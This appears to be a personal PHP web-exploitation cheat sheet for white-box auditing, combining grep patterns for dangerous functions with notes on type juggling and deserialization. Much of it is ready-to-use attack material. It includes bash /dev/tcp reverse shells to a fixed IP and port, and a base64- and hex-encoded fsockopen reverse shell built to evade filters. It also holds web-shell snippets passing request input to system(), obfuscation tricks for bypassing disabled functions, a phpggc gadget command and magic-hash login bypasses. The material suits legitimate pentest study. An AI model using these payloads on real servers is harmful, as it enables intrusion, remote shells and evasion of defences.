    *Enable verbose mode:   /etc/php5/apache2/php.ini ; add: display_errors = On ; sudo systemctl restart apache2
    **Check Version:
        php -v
        Or:  echo "<?php echo phpversion(); ?>" > /var/www/html/ver.php ; curl http://localhost/ver.php
    Check enabled wrappers:  var_dump(stream_get_wrappers());
    Dangerous Functions:  
        https://z-r0crypt.github.io/blog/2021/01/25/dangerous-php-functions/
        https://github.com/rinku191/OSWE-prepration/wiki/PHP-Dangerous-function
    Try to trigger an error that reveals the web root (w/ display_errors enabled):  GET /ATutor/browse.php?access=&search[]=test&include=all&filter=Filter  
    User-Supplied Data:  $_GET, $_POST, $_REQUEST arrays for parameters; $_SERVER array for headers; $_COOKIE array; $_SESSION array
        ex. cat /var/www/html/ATutor/mods/_standard/social/index_public.php | grep '$_GET' --color
        egrep -R '$_GET|$_POST|$_REQUEST' . --color
        Look for 'include' or 'require' with a parameter you control
    File Interaction:  
        Read/Write:  egrep -R 'fopen|readfile|file\(|fpassthru|gzopen|gzfile|gzpassthru|readgzfile|copy|rename|rmdir|mkdir|unlink|file_get_contents|file_put_contents|parse_ini_file' .
        Include/Evaluate PHP:  egrep -R 'include|include_once|require|require_once|virtual' .
    SQLI Vulnerable Functions:  egrep -iR 'mysql_query|mssql_query|pg_query|execute\(\)' .
        Stacking: mysql_* and mysqli_* libraries typically don't support, but PDO connector might
    *Dynamic Code Execution:  egrep -R 'eval\(|call_user_func\(|call_user_method\(|create_function\(|assert|preg_replace\(|Function\(' .
        ex. eval('document.' + potato + '.style.color = "red"');
        Try injecting a sub-eval!
    *OS Commands:  egrep -iR 'exec|passthru|popen|proc_open|pcntl_exec|shell_exec|system(|`.*`' .
        #system() => Execute an external program and displays the output.
        #passthru() => Same than system, but casts the output in binary "as is" from the shell to the PHP output (typically the HTTP response).
        #exec() => Captures the output and only the last line of the output into a string.
        #shell_exec() => Same than exec, but capturing full output, not only the last line.
        Both:  
            eval("system('whoami');");  \\  eval("echo exec('whoami');");  \\  eval("echo `whoami`;");  \\  eval("echo shell_exec('whoami');");  \\  eval("echo passthru('whoami');");
            exec('bash -c "bash -i >& /dev/tcp/192.168.28.130/4444 0>&1"');
            eval("exec('bash -c \"bash -i >& /dev/tcp/192.168.28.130/4444 0>&1\"');");
    LFI/RFI:  egrep -R 'include\(|include_once\(|require\(|require_once\(' .
    Injection Test:  <?php echo "HACKED"; ?>
        <?php echo 'system: '; system('whoami'); system($_REQUEST['cmd']); ?><br/>
        <?php echo 'exec: '; echo exec('whoami'); echo exec($_REQUEST['cmd']); ?><br/>
        <?php echo 'shell_exec: '; shell_exec("whoami"); shell_exec($_REQUEST['cmd']); ?><br/>
        <?php echo 'passthru: '; passthru("whoami"); passthru($_REQUEST['cmd']);?>
    Troubleshooting:
        Interactive:  php -a
        Check Settings/Variable:
            nano /var/www/magic.php ; <?php var_dump(get_magic_quotes_gpc()); ?> ; curl http://localhost/magic.php
        Encoding/Filter Bypass:
            Base64:
                eval(base64_decode('JHNvY2s9ZnNvY2tvcGVuKCIxOTIuMTY4LjI4LjEzMCIsNDQ0NCk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTs='));
                    Better: eval("eval(base64_decode('JHNvY2s9ZnNvY2tvcGVuKCIxOTIuMTY4LjI4LjEzMCIsNDQ0NCk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTs='));");
            Base64 within Hex:
                eval("\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'JHNvY2s9ZnNvY2tvcGVuKCIxOTIuMTY4LjI4LjEzMCIsNDQ0NCk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTs='\x29\x29\x29\x3B");
            Hex and Undefined Variable:
                system("cat /etc/passwd");  ->  "\x73\x79\x73\x74\x65\x6d"("cat /etc$upasswd");
            Comments:
                (system)/*comment here...*/(ls)/* and here. */;
            String concatenation:
                ex. Without quotes:   ...?code=(sy.(st).em)(whoami);
                    ex. Added variables:  ...?a=system&b=cat+/etc&c=/passwd&code=$_GET[a]($_GET[b].$_GET[c]);
                ex.  $a="system('";$b="whoami');";eval("$a$b");
                ex.  eval("\$a=\"system('\";\$b=\"whoami');\";eval(\"$a$b\");");
                ex.  eval("\$a=\"system('\";\$b=\"whoami');\";$a$b;");
                ex.  <?php echo system("uname -a");?>  ->  <?php $a="sy";$b="stem";$c=$a.$b; $c("uname -a");?>
            Calling function by Index:
                Get index of 'system':  print_r(get_defined_functions()[internal]);
                Call:  get_defined_functions()[internal][381](whoami);
            Character Arrays:
                ex. system("ls /tmp");  ->  $a="elmsty/ ";($a[3].$a[5].$a[3].$a[4].$a[0].$a[2])($a[1].$a[3].$a[-1].$a[-2].tmp);
                Using file name: (__FILE__)[18].(__FILE__)[2]. ...etc
    Important File:  php.ini - Notable & Potentially Dangerous Settings:
        `register_globals`: PHP creates global variables automatically for all request parameters
        If `allow_url_fopen` and `allow_url_include` are on: RFI possible
            If only allow_url_fopen: possible LFI (but only for include_path)
            Even if off: possible through SMB in some PHP versions!
        `file_uploads` & `upload_tmp_dir`
        `magic_quotes_gpc` (' -> \') or `magic_quotes_sybase` (' -> '') - be aware if trying SQLI
        disable_functions -> May affect payloads!
    Look for Logic Errors! (ex. missing `exit;`)
        ex. Proper Usage:
            if ($current > $expiry_date) {
                $msg->addError('INVALID_LINK'); 
                $savant->display('password_reminder_feedback.tmpl.php'); 
                exit;
    Type Juggling:
        https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
        Most Cases: only <= PHP 5
        Some Cases (0eXX...) work for PHP 7
        *Try both 0 and [] and a magic hash!
        Is loose comparison being used, or can you control a variable being compared?
            Look for... Loose comparisons using values/variables that you control!... any admin functions/input submit... email change, etc.
            *Indicators:  using == or != instead of === or !==, not using "strict" comparison options, not typecasting  
        *PHP attempts to perform an implicit **string-to-integer** conversion when using loose comparison operators.
            *See Loose PHP Comparisons Chart -> Test every possibility!
        egrep -R '\=\=|\!\=|\(int\)|\(str\)' . | egrep -v '\=\=\=|\!\=\='
        egrep -iR 'if.*\=\=' .
        Examples:
            var_dump('0xAAAA' == '43690'); var_dump('0xAAAA' == 43690); ("7 puppies" == 7) -> True; ("Puppies" == 0) -> True (because string doesn't contain an integer); var_dump(111a < "30"); -> True
            If: string that starts with digits, followed by "e", followed by only digits, and this string is used in a numeric context (such as comparison to another number), it will be evaluated as a number
                Also true for PHP 7
                var_dump('0e1111' == '0'); var_dump('0e9999' == 0); -> True
            Applications:
                if ($_POST["password"] == "Admin_Password") {login_as_admin();}  ->  (0 == "Admin_Password") -> True
                Another Vulnerable Auth Function:
                    if (strcmp($_POST['password'], 'thePassword') == 0) 
                    Instead of password=... submit an array: password[]=
                    strcmp(array(), "thePassword") -> NULL ; NULL==0
            Magic Hashes:
                echo md5('240610708');  ->  var_dump('0e462097431906509019562988736854' == '0');  -> True
                https://github.com/spaze/hashes
                Easier to abuse if only a substring of the hash is used for comparison
            Patched Example:  (int)"0e23812" === (int)"0e48394832"
        ***Vulnerable if user can specify the input type directly (OR through json_decode() or unserialize()):
            {"password": "0"} vs. {"password": 0} in the request
            (Submit HTTP Parameter as Integer using JSON)
            *OR if deserialization preserves the data type!       
    Deserialization:
        Vulnerable:  unserialize()
            egrep -iR 'unserialize|serial' .
        Magic Methods:  egrep -iR '__sleep|__wakeup|__destruct|__toString|__construct' .
            Manual exploitation is likely necessary
        Known Framework/Gadgets:  https://github.com/ambionics/phpggc
            Example:  https://www.youtube.com/watch?v=HaW15aMzBUM 15:00, 29:10
            ex. phpggc Guzzle/RCE1 "shell_exec" "cmd /c calc" -p phar -pf desert -o desert.phar
        Manual POP Chain Exploitation:  https://vickieli.dev/insecure%20deserialization/pop-chains/
        If you have LFI but no PHP execution: try phar:// deserialization - OR PHP Filter RCE
            phar:// method: if you can upload a file -> If unserialize() isn't an option -> file operations with phar:// will trigger unserialize()
            Try if... file upload and lfi available OR try editing php session file through your username, etc.
        Payloads:
            O:len(class_name):"class_name":len(properties_to_edit):{s:len(variable_name):"variable_name";s:len(variable_value):"variable_value";}
            Creation - mimic the vulnerable class, and use 'echo serialize($vulnclass);'  -  https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a
                Or:  print urlencode(serialize(new vulnClass));
        *Can lead to Type Juggling, SQLI, etc. - check where the deserialized results are used!